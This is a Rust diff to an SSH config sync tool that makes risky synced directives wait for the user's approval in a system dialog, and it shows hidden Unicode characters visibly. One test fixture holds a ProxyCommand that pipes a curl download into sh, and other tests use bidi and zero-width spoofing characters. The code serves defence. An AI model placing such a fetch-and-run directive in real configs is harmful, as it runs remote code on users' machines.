@@ -13,6 +13,10 @@
 //!    kind; its choices on conflicts go to the other side
 //!    ([`Message::Decisions`]). The other side puts off its own risky
 //!    changes and mass deletions: its user is asked when they sync from it.
+//!    A risky change the user chose, a conflict settled for the other
+//!    computer's version included, is made only once they allow it in a
+//!    system dialog ([`Side::allow_risky`]), which a script in the page
+//!    can't answer; what they don't allow waits for the next sync.
 //! 4. Each writes its files (after a backup) and says what it has now
 //!    ([`Message::Applied`]). What both have alike becomes the snapshot for
 //!    next time ([`agree`]).
@@ -20,6 +24,7 @@
 //! [`conversation`]: super::pairing::conversation
 
 use std::collections::BTreeMap;
+use std::fmt::Write as _;
 use std::net::TcpStream;
 use std::time::Instant;
 
@@ -38,9 +43,14 @@ use time::format_description::well_known::Rfc3339;
 
 use super::pairing::{ANSWER_TIMEOUT, POLL, PairingFailure, PairingPhase, Side, broken, waiting};
 use super::transfer::STEP_TIMEOUT;
+use crate::confirm::Localized;
 
 /// More incoming deletions than this need the user's yes.
 pub const MASS_DELETE: usize = 5;
+/// Most directives the system dialog lists.
+const SHOWN_LINES: usize = 8;
+/// Longest value the system dialog shows in full.
+const SHOWN_CHARS: usize = 120;
 
 /// What a sync starts from on one side.
 pub struct SyncLocal {
@@ -194,7 +204,7 @@ fn talk(
         &local,
         &plan(&local.state.base, &local.hasher, &mine.hosts, &theirs.hosts),
     );
-    let decisions = settle(session, side, &sorted)?;
+    let decisions = settle(session, side, &local.config, &sorted)?;
     let mut summary = SyncSummary::default();
     let mut state = local.state.clone();
     let changes = choose(
@@ -262,10 +272,12 @@ fn talk(
 }
 
 /// What the users decided: on the side that connected, its user's choices
-/// on whatever needs one, sent to the other side; there, what came.
+/// on whatever needs one, less the risky ones they don't allow in the
+/// system dialog, sent to the other side; there, what came.
 fn settle(
     session: &mut Session<TcpStream>,
     side: &impl Side,
+    config: &SshConfig,
     sorted: &Sorted,
 ) -> Result<SyncDecisions, PairingFailure> {
     if session.is_initiator() {
@@ -281,12 +293,13 @@ fn settle(
                 .collect(),
             deletions: sorted.deletions.iter().map(|c| c.id().to_owned()).collect(),
         };
-        let decisions = if review.is_empty() {
+        let mut decisions = if review.is_empty() {
             SyncDecisions::default()
         } else {
             side.show(None, &PairingPhase::Decide { review });
             decide(session, side)?
         };
+        allow_risky(side, config, sorted, &mut decisions);
         session
             .send(&Message::Decisions {
                 initiator: decisions.mine.clone(),
@@ -296,9 +309,10 @@ fn settle(
         side.show(None, &PairingPhase::Syncing);
         return Ok(decisions);
     }
+    // The other user reviews, then may see the system dialog.
     let _ = session
         .stream()
-        .set_read_timeout(Some(ANSWER_TIMEOUT + STEP_TIMEOUT));
+        .set_read_timeout(Some(ANSWER_TIMEOUT * 2 + STEP_TIMEOUT));
     let Message::Decisions {
         initiator: theirs_stay,
         responder: mine_stay,
@@ -312,6 +326,147 @@ fn settle(
         theirs: theirs_stay,
         ..SyncDecisions::default()
     })
+}
+
+/// Keeps in `decisions` only the risky changes this computer's user allows
+/// in the system dialog: the ones they chose to make, and the conflicts
+/// they settled for the other computer's version that would add a directive
+/// running a program or reaching beyond the host. The page's choice alone
+/// never writes one. On a no, all of them wait for the next sync; the rest
+/// of the sync goes on.
+fn allow_risky(
+    side: &impl Side,
+    config: &SshConfig,
+    sorted: &Sorted,
+    decisions: &mut SyncDecisions,
+) {
+    let mut asked: Vec<RiskyChange> = sorted
+        .risky
+        .iter()
+        .filter(|(change, _)| decisions.apply.iter().any(|id| id == change.id()))
+        .map(|(change, lines)| RiskyChange {
+            id: change.id().to_owned(),
+            lines: lines.clone(),
+        })
+        .collect();
+    for conflict in &sorted.conflicts {
+        if !decisions.theirs.contains(&conflict.id) {
+            continue;
+        }
+        let lines = hosts::risky(config, &conflict.take_theirs()).unwrap_or_default();
+        if !lines.is_empty() {
+            asked.push(RiskyChange {
+                id: conflict.id.clone(),
+                lines,
+            });
+        }
+    }
+    if asked.is_empty() || side.allow_risky(&asked) {
+        return;
+    }
+    let asked = |id: &String| asked.iter().any(|change| change.id == *id);
+    decisions.apply.retain(|id| !asked(id));
+    decisions.theirs.retain(|id| !asked(id));
+}
+
+/// The system dialog that asks to allow `changes` from a sync with `peer`
+/// in the config file `file`: its title, text and button.
+pub fn risky_prompt(
+    peer: &str,
+    file: &str,
+    changes: &[RiskyChange],
+) -> (Localized, Localized, Localized) {
+    let en = risky_list(changes, |n| format!("…and {n} more"));
+    let ru = risky_list(changes, |n| format!("…и ещё {n}"));
+    let uz = risky_list(changes, |n| format!("…va yana {n} ta"));
+    let peer = shown(peer);
+    (
+        Localized::new(
+            "Allow ssh to run this?",
+            "Разрешить ssh запускать это?",
+            "ssh buni ishga tushirsinmi?",
+        ),
+        Localized::new(
+            format!(
+                "The sync with {peer} adds to {file} what makes ssh run programs, load code \
+                 or let the server use this computer each time you connect:\n\n{en}\n\n\
+                 Allow it only if you made these changes on {peer} yourself. Otherwise \
+                 they wait for the next sync."
+            ),
+            format!(
+                "Синхронизация с {peer} добавляет в {file} то, из-за чего ssh при каждом \
+                 подключении запускает программы, загружает код или даёт серверу доступ к \
+                 этому компьютеру:\n\n{ru}\n\n\
+                 Разрешайте, только если эти изменения на {peer} сделали вы сами. Иначе \
+                 они подождут следующей синхронизации."
+            ),
+            format!(
+                "{peer} bilan sinxronlash {file} ga ssh har safar ulanganda dasturlarni \
+                 ishga tushiradigan, kod yuklaydigan yoki serverga bu kompyuterdan \
+                 foydalanishga ruxsat beradigan narsalarni qoʻshadi:\n\n{uz}\n\n\
+                 Faqat bu oʻzgarishlarni {peer} da oʻzingiz qilgan boʻlsangiz, ruxsat \
+                 bering. Aks holda ular keyingi sinxronlashni kutadi."
+            ),
+        ),
+        Localized::new(
+            "Allow and sync",
+            "Разрешить и синхронизировать",
+            "Ruxsat berish va sinxronlash",
+        ),
+    )
+}
+
+/// One line per directive (`• Host prod: ProxyCommand …`), at most
+/// [`SHOWN_LINES`] of them; `more` says how many were left out.
+fn risky_list(changes: &[RiskyChange], more: impl Fn(usize) -> String) -> String {
+    let all: Vec<String> = changes
+        .iter()
+        .flat_map(|change| {
+            change.lines.iter().map(move |line| {
+                format!(
+                    "• Host {}: {} {}",
+                    shown(&change.id),
+                    shown(&line.key),
+                    shown(&line.value)
+                )
+            })
+        })
+        .collect();
+    let mut lines: Vec<String> = all.iter().take(SHOWN_LINES).cloned().collect();
+    if all.len() > SHOWN_LINES {
+        lines.push(more(all.len() - SHOWN_LINES));
+    }
+    lines.join("\n")
+}
+
+/// `text` as the dialog shows it: control characters and invisible or
+/// direction-changing ones as `<U+…>`, so what is shown is what `ssh` runs,
+/// and at most [`SHOWN_CHARS`] characters, with how many more there are.
+fn shown(text: &str) -> String {
+    let mut out = String::with_capacity(text.len());
+    for (i, c) in text.chars().enumerate() {
+        if i == SHOWN_CHARS {
+            let rest = text.chars().count() - SHOWN_CHARS;
+            let _ = write!(out, "… (+{rest})");
+            break;
+        }
+        let invisible = matches!(
+            c,
+            '\u{00AD}'
+                | '\u{061C}'
+                | '\u{180E}'
+                | '\u{200B}'..='\u{200F}'
+                | '\u{202A}'..='\u{202E}'
+                | '\u{2060}'..='\u{2069}'
+                | '\u{FEFF}'
+        );
+        if c.is_control() || invisible {
+            let _ = write!(out, "<U+{:04X}>", u32::from(c));
+        } else {
+            out.push(c);
+        }
+    }
+    out
 }
 
 /// The changes to make here after the decisions, counting what waits in
@@ -532,6 +687,18 @@ mod tests {
                 .contains("ProxyCommand ssh -W %h:%p bastion")
         );
         assert_eq!(right_sum.deferred, 0);
+        // The system dialog asked first, naming the directive.
+        assert_eq!(
+            *left.asked_risky.lock().unwrap(),
+            [RiskyChange {
+                id: "c".into(),
+                lines: vec![RiskyLine {
+                    key: "ProxyCommand".into(),
+                    value: "ssh -W %h:%p bastion".into()
+                }]
+            }]
+        );
+        assert_eq!(right.asked_risky.lock().unwrap().len(), 0);
 
         // To the side that answered: put off there until its user syncs.
         let left_text = left.config_text().replace("Host c", "Host d");
@@ -540,6 +707,91 @@ mod tests {
         assert_eq!(right_sum.deferred, 1);
         assert_eq!(left_sum.deferred_there, 1);
         assert!(!right.config_text().contains("Host d"));
+    }
+
+    #[test]
+    fn the_system_dialog_not_the_page_lets_a_risky_change_in() {
+        let risky = "Host c\n    ProxyCommand sh -c \"curl -s https://example.com/x | sh\"\n";
+        let mut left = Script::own("alice", "s", LEFT);
+        left.decisions.apply = vec!["c".into()];
+        left.allows_risky = false;
+        let ((left_sum, mut left), (_, right)) =
+            sync(left, Script::own("bob", "s", &format!("{RIGHT}\n{risky}")));
+        assert!(!left.config_text().contains("ProxyCommand"));
+        assert_eq!((left_sum.added, left_sum.deferred), (1, 1));
+        assert_eq!(left.asked_risky.lock().unwrap().len(), 1);
+
+        // Not turned down: it comes up again, and goes in once allowed.
+        left.allows_risky = true;
+        let ((left_sum, left), _) = sync(left, right);
+        assert_eq!((left_sum.added, left_sum.deferred), (1, 0));
+        assert!(left.config_text().contains("ProxyCommand sh -c"));
+    }
+
+    #[test]
+    fn a_conflict_settled_for_a_risky_version_needs_the_system_dialog() {
+        let ((_, mut left), (_, right)) = sync(
+            Script::own("alice", "s", LEFT),
+            Script::own("bob", "s", RIGHT),
+        );
+        set(&left, &left.config_text().replace("10.0.0.2", "10.1.1.1"));
+        set(
+            &right,
+            &right
+                .config_text()
+                .replace("10.0.0.2", "10.2.2.2\n    LocalCommand say hi"),
+        );
+        left.decisions.theirs = vec!["b".into()];
+        left.allows_risky = false;
+        let ((left_sum, mut left), (_, right)) = sync(left, right);
+        // Neither version is taken: the conflict waits.
+        assert_eq!(left_sum.conflicts, 1);
+        assert!(left.config_text().contains("10.1.1.1"));
+        assert!(!left.config_text().contains("LocalCommand"));
+        let asked = left.asked_risky.lock().unwrap().clone();
+        assert_eq!(asked.len(), 1);
+        assert_eq!(
+            (asked[0].id.as_str(), asked[0].lines[0].key.as_str()),
+            ("b", "LocalCommand")
+        );
+
+        left.allows_risky = true;
+        let ((left_sum, left), (right_sum, _)) = sync(left, right);
+        assert_eq!((left_sum.conflicts, right_sum.conflicts), (0, 0));
+        assert!(left.config_text().contains("LocalCommand say hi"));
+    }
+
+    #[test]
+    fn the_system_dialog_lists_hosts_and_directives_as_ssh_reads_them() {
+        let change = |id: &str, n: usize| RiskyChange {
+            id: id.into(),
+            lines: (0..n)
+                .map(|i| RiskyLine {
+                    key: "LocalCommand".into(),
+                    value: format!("echo {i}\u{202E}"),
+                })
+                .collect(),
+        };
+        let (title, body, approve) =
+            risky_prompt("Bob\u{200B}", "~/.ssh/config", &[change("prod", 2)]);
+        assert_eq!(title.en, "Allow ssh to run this?");
+        assert_eq!(approve.ru, "Разрешить и синхронизировать");
+        assert!(
+            body.en
+                .contains("The sync with Bob<U+200B> adds to ~/.ssh/config")
+        );
+        assert!(
+            body.en
+                .contains("• Host prod: LocalCommand echo 0<U+202E>\n")
+        );
+        assert!(body.uz.contains("• Host prod: LocalCommand echo 1<U+202E>"));
+
+        let (_, body, _) = risky_prompt("Bob", "config", &[change("a", 5), change("b", 6)]);
+        assert_eq!(body.en.matches("• Host").count(), SHOWN_LINES);
+        assert!(body.en.contains("…and 3 more"));
+        assert!(body.ru.contains("…и ещё 3"));
+        let long = "x".repeat(SHOWN_CHARS + 5);
+        assert_eq!(shown(&long), format!("{}… (+5)", "x".repeat(SHOWN_CHARS)));
     }
 
     #[test]
